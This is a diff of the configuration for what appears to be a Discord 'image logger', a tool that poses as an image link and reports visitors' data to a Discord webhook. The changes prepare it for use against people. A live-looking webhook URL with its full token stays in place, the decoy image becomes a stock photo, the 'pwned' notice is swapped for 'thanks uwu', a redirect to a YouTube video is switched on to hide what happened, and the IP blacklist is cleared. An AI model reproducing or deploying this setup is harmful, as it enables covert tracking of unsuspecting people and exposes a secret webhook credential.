@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1137867385311858809/uyOgSJU46WuyifUareqLQJ033kHvznQPt_ao8_G9dPJAm5VsxWpPxfuiev8pdKH6kh64",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYVS4wQcd0PUb3VxO5_fVanmLmKYzwZabQbw&usqp=CAU", # You can also have a custom image by using a URL argument
+    "image": "https://media.istockphoto.com/id/178487234/it/foto/computer-di-microchip.jpg?s=612x612&w=0&k=20&c=NHVEqPlu1vKQag0WQzIj5so4X5kQnqDLSBz2_RHLSjw=", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "thanks uwu", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://youtu.be/WIRK_pGdIdA" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -63,7 +63,7 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
